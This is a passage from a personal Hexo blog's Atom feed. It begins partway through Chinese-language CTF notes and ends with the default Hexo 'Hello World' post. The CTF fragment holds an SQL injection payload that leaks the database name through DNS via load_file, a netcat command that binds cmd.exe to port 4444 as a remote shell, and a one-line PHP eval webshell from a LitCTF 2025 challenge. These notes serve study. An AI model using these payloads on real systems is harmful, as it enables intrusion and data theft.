load_file(concat(“&#x2F;&#x2F;“,(select database()),”.域名”))) –+</p><p><img src="/2025/05/30/buuctf/Users\xiubi\AppData\Roaming\Typora\typora-user-images\image-20250515230455587.png" alt="image-20250515230455587"></p><p>nc.exe -l -p 4444 -e cmd.exe创建客户端10.204.76.197</p><p>nc 192.         4444</p><h1 id="NSS复现"><a href="#NSS复现" class="headerlink" title="NSS复现"></a>NSS复现</h1><h2 id="LitCTF-2025-easy-file"><a href="#LitCTF-2025-easy-file" class="headerlink" title="[LitCTF 2025]easy_file"></a>[LitCTF 2025]easy_file</h2><p>随便输个用户名登录发现被编码了 看见&#x3D;就想到是base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@``eval``($_POST[123456]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://xiubi1125.github.io/2025/05/11/hello-world/"/>
    <id>https://xiubi1125.github.io/2025/05/11/hello-world/</id>
    <published>2025-05-10T17:36:17.654Z</published>
    <updated>2025-05-10T17:36:17.654Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
